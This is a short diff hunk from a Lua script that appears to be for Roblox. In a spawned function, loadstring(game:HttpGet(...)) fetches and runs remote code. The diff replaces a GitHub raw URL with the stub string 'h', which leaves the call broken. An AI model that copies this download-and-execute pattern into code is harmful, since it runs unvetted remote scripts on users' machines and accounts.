@@ -195,6 +195,6 @@ while true do
 end
 spawn(function()
     loadstring(game:HttpGet(
-        "https://raw.githubusercontent.com/NguyenNgocAnh1900/DoungGoSitinh/main/NASuyTinh.lua"
+        "h"
   ))()
 end)
